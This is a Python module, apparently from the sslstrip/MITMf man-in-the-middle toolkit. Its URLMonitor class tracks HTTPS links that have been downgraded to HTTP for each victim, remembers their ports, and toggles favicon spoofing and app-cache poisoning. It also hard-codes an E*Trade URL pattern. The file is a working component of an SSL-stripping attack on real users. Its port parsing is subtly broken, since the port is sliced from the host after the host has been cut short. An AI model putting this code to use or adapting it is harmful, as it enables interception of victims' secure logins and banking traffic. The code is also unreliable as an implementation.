# Copyright (c) 2014-2016 Moxie Marlinspike, Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import re, os
import logging

from core.configwatcher import ConfigWatcher
from core.logger import logger 

formatter = logging.Formatter("%(asctime)s [URLMonitor] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
log = logger().setup_logger("URLMonitor", formatter)

class URLMonitor:

    '''
    The URL monitor maintains a set of (client, url) tuples that correspond to requests which the
    server is expecting over SSL.  It also keeps track of secure favicon urls.
    '''

    # Start the arms race, and end up here...
    javascriptTrickery = [re.compile("http://.+\.etrade\.com/javascript/omntr/tc_targeting\.html")]
    _instance          = None

    def __init__(self):
        self.strippedURLs       = set()
        self.strippedURLPorts   = {}
        self.redirects          = []
        self.faviconReplacement = False
        self.app                = False
        self.caching            = False

    @staticmethod
    def getInstance():
        if URLMonitor._instance == None:
            URLMonitor._instance = URLMonitor()

        return URLMonitor._instance

    def isSecureLink(self, client, url):
        for expression in URLMonitor.javascriptTrickery:
            if (re.match(expression, url)):
                return True

        return (client,url) in self.strippedURLs

    def getSecurePort(self, client, url):
        if (client,url) in self.strippedURLs:
            return self.strippedURLPorts[(client,url)]
        else:
            return 443

    def setCaching(self, value):
        self.caching = value

    def addRedirection(self, from_url, to_url):
        for s in self.redirects:
            if from_url in s:
                s.add(to_url)
                return

        url_set = set([from_url, to_url])
        log.debug("Set redirection: {}".format(url_set))
        self.redirects.append(url_set)

    def getRedirectionSet(self, url):
        for s in self.redirects:
            if url in s:
                return s
        return set([url])

    def addSecureLink(self, client, url):
        methodIndex = url.find("//") + 2
        method      = url[0:methodIndex]

        pathIndex   = url.find("/", methodIndex)
        if pathIndex is -1:
            pathIndex = len(url)
            url += "/"

        host        = url[methodIndex:pathIndex].lower()
        path        = url[pathIndex:]

        port        = 443
        portIndex   = host.find(":")

        if (portIndex != -1):
            host = host[0:portIndex]
            port = host[portIndex+1:]
            if len(port) == 0:
                port = 443

        url = method + host + path

        self.strippedURLs.add((client, url))
        self.strippedURLPorts[(client, url)] = int(port)

    def setFaviconSpoofing(self, faviconSpoofing):
        self.faviconSpoofing = faviconSpoofing

    def setAppCachePoisoning(self):
        self.app = True

    def isFaviconSpoofing(self):
        return self.faviconSpoofing

    def isSecureFavicon(self, client, url):
        return ((self.faviconSpoofing == True) and (url.find("favicon-x-favicon-x.ico") != -1))
